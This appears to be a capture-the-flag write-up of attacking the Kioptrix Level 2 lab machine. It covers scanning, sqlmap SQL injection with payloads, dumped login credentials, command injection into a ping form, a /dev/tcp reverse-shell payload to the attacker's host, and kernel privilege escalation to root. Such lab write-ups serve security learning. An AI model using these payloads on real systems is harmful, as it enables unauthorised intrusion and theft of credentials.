# Kioptrix_Leve_2 writeup

first we start with network scanning
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.201.61.58    d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.124   ea:cc:1b:fa:fe:b0      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.166   00:0c:29:d9:30:68      1      60  VMware, Inc.                                                                                                                                                   

```
\
next we check for open ports
```bash
Open 10.201.61.166:22
Open 10.201.61.166:80
Open 10.201.61.166:111
Open 10.201.61.166:443
Open 10.201.61.166:631
Open 10.201.61.166:1019
Open 10.201.61.166:3306
```
\
Next, on visiting port 80 , we see a simple login box
\
<img width="328" height="140" alt="image" src="https://github.com/user-attachments/assets/703ca4ad-4b39-4a26-bbf8-5f9c714d7f0c" />
\
Next we try to loginn using simple admin:admin , but it does not work 
\
So we save the request to a file and use sqlmap on it 
```bash
sqlmap -r sqlreq1 --level 3 --risk 3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:26:38 /2026-01-17/

[02:26:38] [INFO] parsing HTTP request from 'sqlreq1'
[02:26:38] [INFO] resuming back-end DBMS 'mysql' 
[02:26:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-1470' OR 6624=6624-- Jlko&psw=admin&btnLogin=Login

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: uname=admin' AND 5169=BENCHMARK(5000000,MD5(0x5263634e))-- kPno&psw=admin&btnLogin=Login
---
[02:26:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 4
web application technology: Apache 2.0.52, PHP 4.3.9
back-end DBMS: MySQL < 5.0.12
[02:26:38] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:26:38] [INFO] fetching current database
[02:26:38] [INFO] resumed: webapp
[02:26:38] [INFO] fetching tables for database: 'webapp'
[02:26:38] [INFO] fetching number of tables for database 'webapp'
[02:26:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:26:38] [INFO] retrieved: 
[02:26:38] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)                                                                                        
[02:26:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[02:26:39] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[02:26:39] [WARNING] unable to retrieve the number of tables for database 'webapp'
[02:26:39] [INFO] fetching number of tables for database 'webapp'
[02:26:39] [INFO] retrieved: 
[02:26:39] [INFO] retrieved: 
[02:26:39] [ERROR] unable to retrieve the table names for any database
[02:26:39] [INFO] fetching columns for table 'users' in database 'webapp'
[02:26:39] [INFO] retrieved: 
[02:26:39] [INFO] retrieved: 
[02:26:39] [ERROR] unable to retrieve the number of columns for table 'users' in database 'webapp'
[02:26:39] [WARNING] unable to retrieve column names for table 'users' in database 'webapp'

[02:28:10] [WARNING] running in a single-thread mode. This could take a while
[02:28:10] [INFO] retrieved: id                                                                                                                                                                                   
[02:28:10] [INFO] retrieved: username                                                                                                                                                                             
[02:28:10] [INFO] retrieved: password                                                                                                                                                                             
                                                                                                                                                                          
                                                                                                                                                                                                                  
[02:28:11] [WARNING] unable to enumerate the columns for table 'users' in database 'webapp'

```
\
There is some error but we find that it is vulnerable to sql injection and the db name is webapp and it has a table users
\
so we use
```bash
sqlmap -r sqlreq1 -D webapp -T users -C username,password --dump --hex --threads=1 
```
\
we get a db dump
```bash
Database: webapp
Table: users
[2 entries]
+----------+------------+
| username | password   |
+----------+------------+
| admin    | 5afac8d85f |
| john     | 66lajGGbla |
+----------+------------+
```
\
so logging in with admin:5afac8d85f , takes us to a admin console
\
<img width="620" height="73" alt="image" src="https://github.com/user-attachments/assets/894f72b7-c44d-4203-82c4-d7c6b5cc2d76" />
\
it was a basic ping cmd , so i thought it might be vulnerable to command injection 
\
so i used 
```bash
0.0.0.0; ls
```
\
and we can see the succesful command injection output at /pingit.php
```bash
0.0.0.0; ls
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms

--- 0.0.0.0 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.013/0.020/0.032/0.009 ms, pipe 2
index.php
pingit.php
```
\
So, lets get a shell ,listen on port 4444 , using nc or any other tool and run this payload
```bash
0.0.0.0; /bin/sh -i >& /dev/tcp/10.201.61.14/4444 0>&1
```
\
After enumerating , i couldnt find any useful file or anything , so i checked for kernel exploits 
```bash
searchsploit CentOS 4.5        
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)                                            | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)                                             | linux_x86/local/9542.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                                                                                    | linux/local/35370.c
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------
```
\
The 9542 from exploitdb suits our case , so lets use that 
```bash
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```
The end , thank you for reading till here
